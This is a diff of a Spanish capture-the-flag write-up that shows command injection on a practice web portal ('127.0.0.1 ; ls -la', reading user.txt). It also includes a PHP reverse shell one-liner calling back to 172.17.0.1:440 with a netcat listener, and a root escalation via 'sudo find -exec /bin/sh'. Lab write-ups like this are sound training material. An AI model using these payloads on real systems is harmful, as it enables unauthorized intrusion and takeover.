@@ -82,34 +82,42 @@ En robots.txt solo hay una palabra que parece una contraseña, podríamos probar
 ### Vector de Ataque
 Escribimos el usuario y la contraseña encontrados y estamos dentro, vemos que es portal.php, una de las rutas que encontramos previamente pero a la que no podíamos acceder antes.
 <img width="1682" height="505" alt="8dentro" src="https://github.com/user-attachments/assets/b1369a21-b7a3-41cb-bec4-da1599394d7d" />
-SEGUIR 8 subida
+
+
+Probamos a lanzar un ping y seguido un ls para ver si nos lo ejecuta y nos lo lanza. Ahora podemos ver todo lo que hay en el directrio actual y vemos un txt un poco sospechoso.
 
 ```bash
 127.0.0.1 ; ls -la
 ```
 
-
+<img width="1445" height="533" alt="9ls" src="https://github.com/user-attachments/assets/dbb5659d-48a9-41c8-afdd-1d3300e0e291" />
 <br><br>
 
 Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
 Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.
 
 
-
+<img width="1665" height="593" alt="10" src="https://github.com/user-attachments/assets/aecc21c9-72bf-4125-a7b8-e18a1f86bfc2" />
 <br><br>
+
+Verificamos que esta sea la respuesta a la primera pregunta y es correcto.
+<img width="686" height="272" alt="11ingredientee" src="https://github.com/user-attachments/assets/f33c898b-53a2-4147-b000-6e2617843e58" />
+<br><br>
+Ahora vamos a mirar la pista, está en un fichero llamado clue.txt
+<img width="1518" height="557" alt="11png" src="https://github.com/user-attachments/assets/1152255a-d1f9-44b6-a6c8-0554309b7b10" />
+<br><br>
+
 Entramos al directorio del usuario....
 
 ```bash
 127.0.0.1 ;  cat /home/web-admin/user.txt
 ```
 
-<img width="1506" height="885" alt="7flagusuario" src="https://github.com/user-attachments/assets/c1d26f07-a1b5-41f8-bbe6-8358db60f015" />
 <br><br>
 
 La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.
 
 
-<img width="988" height="518" alt="8flag" src="https://github.com/user-attachments/assets/cf806bdf-c760-4547-8e9a-85f08d76a89a" />
 <br><br>
 
 
@@ -121,7 +129,6 @@ Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* haci
 127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
-<img width="1372" height="821" alt="9revelsehell" src="https://github.com/user-attachments/assets/9bb10cb9-70d3-4eb2-a2d6-64e762e2ec23" />
 <br><br>
 
 
@@ -130,7 +137,6 @@ Ponemos nuestro *netcat* a la escucha para recibir la conexión:
 sudo nc -lvnp 440
 ```
 
-<img width="978" height="307" alt="10recibida" src="https://github.com/user-attachments/assets/f5b44944-fba7-4f5f-a727-f65fb4943e64" />
 <br><br>
 
 Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.
@@ -163,17 +169,14 @@ Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña
 sudo find . -exec /bin/sh \; -quit
 ```
 
-<img width="991" height="428" alt="11root" src="https://github.com/user-attachments/assets/856ffe1c-6d52-4d25-88f3-c5de7978d181" />
 <br><br>
 
 
 ¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.
 
-<img width="1086" height="181" alt="12flag2" src="https://github.com/user-attachments/assets/6bf0cbce-83f4-4349-951a-ecf3790287f7" />
 <br><br>
 
 Por último, validamos la flag obtenida.
-<img width="992" height="691" alt="Finaaal" src="https://github.com/user-attachments/assets/b42ae430-6909-416c-89e2-60fd0f683364" />
 
 
 
